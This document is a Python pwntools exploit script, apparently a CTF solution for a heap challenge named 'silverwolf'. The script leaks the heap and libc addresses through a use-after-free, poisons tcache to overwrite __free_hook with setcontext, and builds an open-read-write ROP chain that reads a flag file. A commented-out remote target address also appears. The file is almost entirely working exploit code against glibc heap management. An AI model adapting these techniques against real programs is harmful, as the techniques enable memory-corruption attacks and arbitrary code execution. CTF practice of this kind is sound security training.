#coding:UTF-8
from pwn import *
# context.log_level = 'debug'
# p = remote('124.71.224.30',20990)
elf = ELF('./silverwolf')
p = elf.process()
# libc = ELF('libc-2.27.so')
context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx,size):
    p.recvuntil("Your choice: ")
    p.sendline('1')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))

def edit(idx,con):
    p.recvuntil("Your choice:")
    p.sendline('2')
    p.recvuntil("Index:")
    p.sendline(str(idx))
    p.recvuntil("Content:")
    p.send(con)

def show(idx):
    p.recvuntil("Your choice: ")
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil("Your choice: ")
    p.sendline('4')
    p.recvuntil("Index:")
    p.sendline(str(idx))

add(0,0x10)
delete(0)
show(0)
p.recvuntil('Content: ')
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x1750
info("heap_base: " + hex(heap_base))
for i in range(12):
	add(0,0x10)
for i in range(7):
	add(0,0x50)
for i in range(11):
	add(0,0x60)
for i in range(7):
	add(0,0x70)

add(0,0x60)
delete(0)

for i in range(7):
    edit(0,p64(0)*2+'\n')
    delete(0)

add(0,0x70)
delete(0)

for i in range(7):
    edit(0,p64(0)*2+'\n')
    delete(0)

add(0,0x50)
p.sendlineafter("choice: ",0x400*'1')
add(0,0x40)

show(0)
p.recvuntil('Content: ')
libc_addr = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 0x3ebd80
libc.address = libc_addr
# one_gadget = libc_addr + 0x4f432
system = libc.symbols['system']
free_hook = libc.sym['__free_hook']
set_context = libc.sym['setcontext'] + 53
mprotect = libc.sym['mprotect']
info('libc_addr: ' + hex(libc_addr))
info('system: '+ hex(system))
info("free_hook: " + hex(free_hook))
info("setcontext: " + hex(set_context))
info("mprotect: " + hex(mprotect))
add(0,0x70)
delete(0)
edit(0,p64(0)*2+'\n')
delete(0)
add(0,0x70)
edit(0,p64(free_hook-0x10)+'\n')
add(0,0x70)
add(0,0x70)

gdb.attach(p)
edit(0,p64(set_context))
syscall = libc.search(asm("syscall\nret")).next()
info('syscall: ' + hex(syscall))
# add(0,0x40)

ret = libc_addr + 0x00000000000008aa # ret
pop_rdi_ret = libc_addr + 0x00000000000215bf # pop rdi ; ret
pop_rsi_ret = libc_addr + 0x0000000000023eea # pop rsi ; ret 
#pop_rdx_rsi_ret = libc_addr + 0x0000000000130569 # pop rdx ; pop rsi ; ret
pop_rdx_ret = libc_addr + 0x0000000000001b96 # pop rdx ; ret
pop_rax_ret = libc_addr + 0x0000000000043ae8

Open = libc.sym['open']
Read = libc.sym['read']
# info(hex(Read))
Write = libc.sym['write']
# syscall = Read + 15
FLAG  = heap_base + 0x1b70
info("FLAG: " + hex(FLAG))
orw  = p64(pop_rdi_ret) + p64(FLAG)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(syscall)

orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(heap_base)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Read)

orw += p64(pop_rdi_ret) + p64(1)
orw += p64(Write)

p.sendline('1')
add(0,0x38)
edit(0,'./flag\x00')
p.sendline('1')
# for i in range(6):
#     add(0,0x78)
# edit(0,orw[:0x60])
# p.sendline('1')
# add(0,0x58)
# edit(0,orw[0x60:])
# gdb.attach(p,"b *$rebase(0x202048)")
# add(0,0x68)
# edit(0,p64(heap_base + 0x3000) + p64(pop_rdi_ret + 1))
# add(0,0x58)
# # gdb.attach(p)
# delete(0)

# raw_input()
p.interactive()